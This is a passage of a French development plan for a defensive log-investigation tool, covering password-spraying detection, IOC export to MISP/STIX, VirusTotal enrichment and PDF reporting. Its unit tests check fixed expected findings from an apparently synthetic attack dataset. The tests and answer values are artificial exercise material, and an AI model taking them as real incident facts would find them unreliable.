    def test_intervalle(self):  # deux valeurs différentes, horloge figée → dormir appelé avec 15
    def test_enrichir_iocs(self): # liste mixte → comptage par statut, attributs remplis, target-user "non_applicable"
```

- [ ] **Step 2: Vérifier l'échec** — `python3 -m unittest tests.test_enrichissement_vt -v` → FAIL.
- [ ] **Step 3: Implémenter `enrichissement_vt.py`.**
- [ ] **Step 4: Vérifier** → PASS (aucun accès réseau).
- [ ] **Step 5: Commit** — `feat: enrichissement VirusTotal avec cache et rate limit`

---

### Task 8: Étape 5, rapport texte et CLI

**Files:** Modify `investigation.py` ; Test `tests/test_investigation.py`

**Interfaces:**
- Consumes: tout ce qui précède, `iocs.extraire_iocs/exporter_misp_csv/exporter_stix`, `enrichissement_vt.ClientVT/enrichir_iocs`.
- Produces:
  - `@dataclass Investigation(chemin: str, evts: list[Evenement], det: ResultatDetection, piv: ResultatPivot, chronos: list[Chronologie], actions: list[Action], gravite: str, iocs: list, comptage_vt: dict[str, int] | None, multi_jours: bool)`
  - `investiguer(chemin: str, enrichir: bool = False, client_vt=None) -> Investigation` — enchaîne étapes 1–5 ; si `enrichir` et `client_vt is None`, crée `ClientVT(os.environ.get("VT_API_KEY"), VT_CACHE, …paramètres)`.
  - `expliquer_etape5(iocs: list, comptage_vt: dict | None) -> str` — nombre d'IOC par type, liste (valeur, type, statut VT), rappel « aucun fichier ni échantillon envoyé », mention RFC 5737 si applicable, « enrichissement non demandé (--enrichir) » si `None`.
  - `rapport_texte(inv: Investigation) -> str` — en-tête (fichier, nb événements, période UTC, gravité) + étapes 1 à 5.
  - `main(argv: list[str] | None = None) -> int` — args : chemin optionnel (défaut `FICHIER_LOGS`), `--enrichir` ; imprime le rapport, écrit `SORTIE_TXT`, `SORTIE_MISP`, `SORTIE_STIX` ; PDF via Task 9 ; `ErreurChargement` → message sur stderr, retour 1.
  - `if __name__ == "__main__": sys.exit(main())`

- [ ] **Step 1: Tests qui échouent**

```python
class TestBoutEnBout(unittest.TestCase):
    def test_jeu_synthetique(self):
        t = rapport_texte(investiguer(chemin_jeu_synthetique))
        for n in range(1, 6): self.assertIn(f"=== ÉTAPE {n}", t)
        self.assertEqual(t.count("Recherche :"), 5); self.assertGreaterEqual(t.count("->"), 5)
    def test_jeu_fourni_non_regression(self):
        t = rapport_texte(investiguer("logs_test.json"))
        for attendu in ("203.0.113.47", "37 échecs", "14 comptes", "j.martin", "WKS-014", "winword.exe",
                        "\\MicrosoftUpdateSync", "svc_backup", "Administrateurs", "journal", "10.2.5.9", "svc_sql"):
            self.assertIn(attendu, t)
    def test_jeu_vide(self):
        # fichier "[]" → main([chemin]) == 0 ; rapport contient "Aucune IP" et les 5 étapes
    def test_sans_4625(self):  # seulement les 2 événements légitimes → idem
    def test_fichier_absent(self): self.assertEqual(main(["inexistant.json"]), 1)
    def test_enrichissement_injecte(self):
        # investiguer(..., enrichir=True, client_vt=ClientVT(None, tmp)) → comptage {"cle_absente": n, "non_applicable": m, ...}
    def test_aucune_valeur_en_dur(self):
        sources = "".join(open(f, encoding="utf-8").read() for f in
                          ("investigation.py","iocs.py","enrichissement_vt.py","rapport_pdf.py") if os.path.exists(f))
        for v in ("203.0.113.47","10.2.5.9","j.martin","WKS-014","svc_backup","MicrosoftUpdateSync","svc_sql","2026-03-12"):
            self.assertNotIn(v, sources)
```

`main` écrit dans le dossier courant : les tests appellent `main` dans un `tempfile.TemporaryDirectory()` avec `os.chdir` (restauré dans `tearDown`) et passent un chemin absolu vers les logs.

- [ ] **Step 2: Vérifier l'échec** → FAIL.
- [ ] **Step 3: Implémenter** `Investigation`, `investiguer`, `expliquer_etape5`, `rapport_texte`, `main` (`argparse`).
- [ ] **Step 4: Vérifier** — `python3 -m unittest discover -s tests -v` → tout PASS.
- [ ] **Step 5: Commit** — `feat: étape 5, rapport texte et ligne de commande`

---

### Task 9: Rapport PDF à la charte Formind

**Files:** Create `rapport_pdf.py`, `tests/test_rapport_pdf.py` ; Modify `investigation.py` (`construire_donnees_rapport`, appel dans `main`)

**Interfaces:**
- Consumes: `Investigation`.
- Produces:
  - `construire_donnees_rapport(inv: Investigation, genere_le: datetime) -> dict` dans `investigation.py`, clés : `titre` (str), `periode` (str), `gravite` (str), `synthese` (list[str], 3 phrases non techniques construites depuis les faits), `actions_prioritaires` (list[str], priorité IMMÉDIAT), `etapes` (list[{"titre": str, "texte": str}], textes des `expliquer_*`), `chronologie` (list[[heure, machine, compte, description]]), `plan` (list[[fait, action, priorité]]), `iocs` (list[[valeur, type, statut VT]]), `genere_le` (str).
  - `generer_pdf(chemin: str, donnees: dict) -> None` dans `rapport_pdf.py` (reportlab platypus, A4).
  - Dans `main` : `try: from rapport_pdf import generer_pdf` / `except ImportError` → ligne « PDF non généré : reportlab absent » ; sinon écrit `SORTIE_PDF` et l'annonce.

Charte : `MARINE = "#1B2A4A"`, `TURQUOISE = "#1FA3A8"`, fond de carte `#F2F7F8`, Helvetica ; titre de page marine gras + sous-titre en pastille turquoise arrondie (texte blanc) ; titres de section dans des pastilles marine arrondies (dessinées via un `Flowable` qui trace `roundRect`) ; tableaux en-tête marine texte blanc, lignes alternées ; badge de gravité coloré (CRITIQUE `#C0392B`, ÉLEVÉE `#E67E22`, MODÉRÉE `#F1C40F`, FAIBLE `#27AE60`) ; pied de page « Document généré automatiquement le … – ForCERT » + numéro de page. Ordre : page 1 synthèse (gravité, 3 phrases, actions prioritaires) ; puis 4 étapes, tableau chronologie, tableau plan, annexe IOC (+ rappel de prudence). Textes échappés pour `Paragraph` (`xml.sax.saxutils.escape`), notamment `\` et `<`.

- [ ] **Step 1: Tests qui échouent**

```python
@unittest.skipUnless(importlib.util.find_spec("reportlab"), "reportlab absent")
class TestPDF(unittest.TestCase):
    def test_pdf_genere(self):
        generer_pdf(chemin, construire_donnees_rapport(investiguer(chemin_jeu_synthetique), datetime.now(timezone.utc)))
        self.assertEqual(open(chemin, "rb").read(5), b"%PDF-")
    @unittest.skipUnless(shutil.which("pdftotext"), "pdftotext absent")
    def test_contenu(self):
        texte = subprocess.run(["pdftotext", chemin, "-"], capture_output=True, text=True).stdout
        for attendu in (IP_SPRAY_A, "u.trois", "SRV-FILE02", "adm_tmp", "CRITIQUE", "OneDriveSyncHelper"):
            self.assertIn(attendu, texte)
    def test_donnees_rapport(self):
        d = construire_donnees_rapport(inv, genere_le)
        self.assertEqual(len(d["synthese"]), 3); self.assertEqual(len(d["etapes"]), 5)
        self.assertTrue(all(len(l) == 3 for l in d["plan"]))
```

- [ ] **Step 2: Vérifier l'échec** — `python3 -m unittest tests.test_rapport_pdf -v` → FAIL.
- [ ] **Step 3: Implémenter** `construire_donnees_rapport`, `rapport_pdf.py`, branchement dans `main`.
- [ ] **Step 4: Vérifier** — tous les tests PASS.
- [ ] **Step 5: Contrôle visuel** — générer le PDF du jeu fourni, `pdftoppm -r 60 -png rapport_incident.pdf <scratchpad>/rapport` et regarder les pages : pas de texte qui déborde, pastilles lisibles, tableaux non coupés de façon absurde. Corriger si besoin.
- [ ] **Step 6: Commit** — `feat: rapport PDF à la charte Formind`

---

### Task 10: Livrables

**Files:** Create `NOTES.md` ; générer `sortie_rapport.txt`, `rapport_incident.pdf`, `iocs_misp.csv`, `iocs_stix.json`

- [ ] **Step 1: Exécuter** — `python3 investigation.py logs_test.json` → code 0 ; les quatre fichiers existent ; la sortie montre 203.0.113.47 / 37 échecs / 14 comptes / 08:02–08:18, j.martin sur WKS-014 à 08:21, les 5 événements post-intrusion, le plan, les IOC ; 10.2.5.9 écartée comme faux positif.
- [ ] **Step 2: Robustesse** — `python3 investigation.py <chemin jeu synthétique exporté en JSON>` → résultats conformes aux Tasks 2–5, aucune valeur du jeu fourni.
- [ ] **Step 3: Enrichissement** — `VT_API_KEY= python3 investigation.py --enrichir` → étape 5 explique « clé absente » ; si l'utilisateur fournit une clé, relancer : 203.0.113.47 « non soumise (RFC 5737) ».
- [ ] **Step 4: Écrire `NOTES.md`** (5–10 lignes) : seuils 10/5 et pourquoi (spraying = beaucoup de comptes, peu d'essais chacun) ; classes force brute / faux positif et `RESEAUX_INTERNES` ; incohérence `result` sur les 4625 ; IP RFC 5737 → VT ne renvoie rien, pipeline jugé sur sa robustesse ; limites (seuil fixe, pas de fenêtre glissante, périmètre machine+compte, pas de corrélation Kerberos/4768/4771) ; pistes (seuil adaptatif, fenêtres temporelles, règles Sigma/SPL, import OpenCTI automatique) ; usage IA ; ajustements du mapping MISP éventuels (Task 6 Step 5).
- [ ] **Step 5: Suite complète** — `python3 -m unittest discover -s tests -v` → tout PASS.
- [ ] **Step 6: Commit** — `docs: livrables et notes`
